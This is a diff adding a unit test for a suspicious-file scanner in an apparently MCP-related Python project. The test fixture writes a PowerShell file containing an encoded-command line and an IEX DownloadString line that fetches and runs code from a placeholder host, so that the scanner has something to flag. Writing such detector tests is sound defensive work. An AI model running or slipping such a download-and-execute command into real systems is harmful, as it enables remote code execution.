@@ -24,6 +24,7 @@ from allcanuse_mcp.core.filesystem import write_binary_file
 from allcanuse_mcp.core.filesystem import write_json_file
 from allcanuse_mcp.core.filesystem import write_text_file
 from allcanuse_mcp.core.filesystem import zip_paths
+from allcanuse_mcp.core.security_scan import scan_suspicious_files
 from unittest.mock import patch
 
 
@@ -173,6 +174,33 @@ class FilesystemTests(unittest.TestCase):
         regex = search_text(str(source), query=r"def\s+\w+\(", use_regex=True, file_pattern="*.py")
         self.assertEqual(regex["count"], 1)
         self.assertEqual(regex["matches"][0]["line_number"], 1)
+
+        delete_path(str(base), recursive=True, missing_ok=True)
+
+    def test_scan_suspicious_files_reports_paths_and_reasons(self) -> None:
+        base = Path(tempfile.gettempdir(), "allcanuse-security-scan-test")
+        if base.exists():
+            delete_path(str(base), recursive=True, missing_ok=True)
+        mkdir_path(str(base))
+        suspicious = base / "payload.ps1"
+        write_text_file(
+            str(suspicious),
+            "powershell -EncodedCommand SQBFAFgA\n"
+            "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')\n",
+        )
+        benign = base / "notes.txt"
+        write_text_file(str(benign), "meeting notes\n")
+
+        result = scan_suspicious_files([str(base)], max_depth=2, max_results=10)
+
+        self.assertTrue(result["ok"])
+        self.assertGreaterEqual(result["count"], 1)
+        paths = [item["path"] for item in result["findings"]]
+        self.assertIn(str(suspicious.resolve()), paths)
+        finding = next(item for item in result["findings"] if item["path"] == str(suspicious.resolve()))
+        self.assertIn("sha256", finding)
+        self.assertTrue(any("content hit" in reason for reason in finding["reasons"]))
+        self.assertEqual(finding["relative_path"], "payload.ps1")
 
         delete_path(str(base), recursive=True, missing_ok=True)
 
